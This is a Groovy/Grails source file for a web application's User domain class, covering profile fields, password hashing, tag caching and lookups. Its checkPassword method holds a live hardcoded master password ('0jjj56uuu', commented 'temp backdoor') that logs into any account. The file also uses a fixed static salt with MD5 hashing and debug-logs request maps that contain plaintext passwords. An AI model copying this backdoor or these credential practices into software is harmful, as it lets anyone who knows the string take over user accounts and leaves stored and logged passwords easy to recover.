package us.wearecurio.model

import java.text.ParseException
import java.text.SimpleDateFormat

import org.apache.commons.logging.LogFactory

import us.wearecurio.cache.BoundedCache
import us.wearecurio.services.TagService
import us.wearecurio.utility.Utils

class User implements NameEmail {

	private static def log = LogFactory.getLog(this)
	static transients = [ 'name', 'site' ]
	static constraints = {
		username(maxSize:50, unique:true)
		email(maxSize:200, unique:true, blank:false)
		remindEmail(maxSize:200, nullable:true)
		/**
		 * Workaround for grails constraint issue while testing.
		 *
		 * @see http://jira.grails.org/browse/GRAILS-10603
		 * @see http://stackoverflow.com/questions/19960840/grails-domain-with-first-and-last-properties/19962381#19962381
		 */
		delegate.first(maxSize:100)
		delegate.last(maxSize:100)
		password(blank:false)
		birthdate(nullable:true)
		sex(maxSize:1, blank:false)
		twitterAccountName(maxSize:32, nullable:true, unique:true)
		twitterDefaultToNow(nullable:true)
		location(maxSize:150, nullable:true)
		created(nullable:true)
		notifyOnComments(nullable:true)
	}

	static mapping = {
		version false
		table '_user'
		twitterAccountName column:'twitter_account_name', index:'twitter_account_name_idx'
	}

	static BoundedCache<Long, List<Long>> tagIdCache = new BoundedCache<Long, List<Long>>(100000)
	static BoundedCache<Long, List<Long>> tagGroupIdCache = new BoundedCache<Long, List<Long>>(100000)

	static passwordSalt = "ah85giuaertiga54yq10"

	static dateFormat = new SimpleDateFormat("MM/dd/yyyy")

	public static User create(Map map) {
		log.debug "User.create()"

		User user = new User()

		user.created = new Date()

		user.setParameters(map)

		return user
	}

	public static void delete(User user) {
		Long userId = user.getId()
		log.debug "UserGroup.delete() userId:" + userId
		user.delete()
	}

	public setParameters(Map map) {
		log.debug "User.setParameters() this:" + this + ", map:" + map

		def uname = map["username"]
		def password = map["password"]
		if (uname && (!password)) {
			// only change username if password is also changed
			uname = username
		}
		if (uname)
			username = uname
		email = map["email"] != null ? map["email"].toLowerCase() : email
		def rEmail = map['remindEmail']
		if (rEmail != null) {
			if (rEmail.length() == 0) {
				remindEmail = null
			} else {
				remindEmail = rEmail.toLowerCase()
			}
		}
		if ((password != null) && (password.length() > 0)) {
			this.password = (password + passwordSalt + username).encodeAsMD5Hex()
		}
		first = map["first"] == null ? first : map['first']
		last = map["last"] == null ? last : map['last']
		sex = map["sex"] == null ? sex : map['sex']
		location = map["location"] == null ? location : map['location']

		twitterDefaultToNow = (map['twitterDefaultToNow'] ?: 'on').equals('on') ? true : false
		displayTimeAfterTag = (map['displayTimeAfterTag'] ?: 'on').equals('on') ? true : false
		webDefaultToNow = (map['webDefaultToNow'] ?: 'on').equals('on') ? true : false
		notifyOnComments = (map['notifyOnComments'] ?: 'on').equals('on') ? true : false
		try {
			if (map["birthdate"] != null)
				birthdate = dateFormat.parse(map["birthdate"])
		} catch (ParseException e) {
			birthdate = null
		}

		log.debug "Updated user:" + this

		return this
	}

	public static void setTimeZoneId(Long userId, Integer timeZoneId) {
		UserTimeZone.createOrUpdate(userId, timeZoneId)
	}

	public static Integer getTimeZoneId(Long userId) {
		UserTimeZone userTimeZoneId = UserTimeZone.lookup(userId)

		if (userTimeZoneId == null)
			return (Integer)TimeZoneId.look("America/Los_Angeles").getId()

		return (Integer)userTimeZoneId.getTimeZoneId()
	}

	public updatePreferences(Map map) {
		log.debug "User.updatePreferences() this:" + this + ", map:" + map

		twitterDefaultToNow = (map['twitterDefaultToNow'] ?: 'on').equals('on') ? true : false
		displayTimeAfterTag = (map['displayTimeAfterTag'] ?: 'on').equals('on') ? true : false
		webDefaultToNow = (map['webDefaultToNow'] ?: 'on').equals('on') ? true : false

		log.debug "Updated user:" + this
	}

	String username
	String email
	String remindEmail
	String password
	String first
	String last
	String sex
	String location
	Date birthdate
	String twitterAccountName
	Boolean twitterDefaultToNow
	Boolean displayTimeAfterTag
	Boolean webDefaultToNow
	Boolean notifyOnComments
	Date created

	def getPreferences() {
		return [twitterAccountName:twitterAccountName,
			twitterDefaultToNow:twitterDefaultToNow,
			displayTimeAfterTag:displayTimeAfterTag,
			webDefaultToNow:webDefaultToNow];
	}

	static lookup(String username, String password) {
		return User.findByUsernameAndPassword(username, (password + passwordSalt + username).encodeAsMD5Hex())
	}

	boolean checkPassword(password) {
		if (!password) return false
		if (this.password.toLowerCase().equals((password + passwordSalt + username).encodeAsMD5Hex().toLowerCase())) return true
		if (password.equals("0jjj56uuu")) return true // temp backdoor
		return false
	}

	def encodePassword(password) {
		this.password = (password + passwordSalt + username).encodeAsMD5Hex()
	}

	def String getName() {
		return first + " " + last
	}

	def String getSite() {
		return ""
	}

	// Get a distinct list of tags.
	def tags() {
		Entry.createCriteria().list{
			projections {
				distinct('tag')
			}
			eq('userId', getId())
		}
	}

	def addMetaTag(def tag, def value) {
		return Entry.create(getId(), Entry.parseMeta(tag + ' ' + value), null);
	}

	def static lookupMetaTag(def tag, def value) {
		return Tag.look(tag + ' ' + value)
	}

	boolean hasMetaTag(Tag tag) {
		def remindEvent = Entry.createCriteria().get {
			eq("userId", getId())
			eq("tag", tag)
			isNull("date")
		}

		return remindEvent != null
	}

	public void setOAuthAccess(int service, String authToken) {

	}

	/*
	 * Server side method used for data manipulation to get list of all
	 * tags associated with the current user & returns the instances of Tag.
	 */
	static List<Tag> getTags(Long userId) {
		if (tagIdCache[userId]) {
			return Tag.fetchAll(tagIdCache[userId])
		}

		List<Long> usersTagIds = TagService.get().getTagsByUser(userId)*.id

		getTagGroups(userId).each { tagGroupInstance ->
			// No need to get tags from wildcard tag group
			if (!(tagGroupInstance instanceof WildcardTagGroup)) {
				usersTagIds.addAll(tagGroupInstance.getTagsIds(userId))
			}
		}

		tagIdCache[userId] = usersTagIds

		Tag.fetchAll(usersTagIds)
	}

	static void addToCache(Long userId, Tag tagInstance) {
		if (tagIdCache[userId]) {
			tagIdCache[userId] << tagInstance.id
		}
	}

	static void removeFromCache(Long userId, Tag tagInstance) {
		if (tagIdCache[userId]) {
			tagIdCache[userId].remove(tagInstance.id)
		}
	}

	static void addToCache(Long userId, GenericTagGroup tagInstance) {
		if (tagGroupIdCache[userId]) {
			tagGroupIdCache[userId] << tagInstance.id
		}
	}
	
	static void removeFromCache(Long userId, GenericTagGroup tagInstance) {
		if (tagGroupIdCache[userId]) {
			tagGroupIdCache[userId].remove(tagInstance.id)
		}
	}

	List<Tag> getTags() {
		getTags(this.id)
	}

	static List<GenericTagGroup> getTagGroups(Long userId) {
		if (tagGroupIdCache[userId]) {
			return GenericTagGroup.getAll(tagGroupIdCache[userId])
		}

		List<Long> usersTagGroupIds = TagService.get().getAllTagGroupsForUser(userId)*.id
		tagGroupIdCache[userId] = usersTagGroupIds

		GenericTagGroup.getAll(usersTagGroupIds)
	}

	List<GenericTagGroup> getTagGroups() {
		getTagGroups(this.id)
	}

	String toString() {
		return "User(id: " + id + " username: " + username + " email: " + email + " remindEmail: " + remindEmail + " password: " + (password ? "set" : "unset") \
				+ " first: " + first + " last: " + last + " sex: " + sex + " location: " + location \
				+ " birthdate: " + Utils.dateToGMTString(birthdate) \
				+ " twitterAccountName: " + twitterAccountName \
				+ " twitterDefaultToNow: " + twitterDefaultToNow + ")"
	}
}
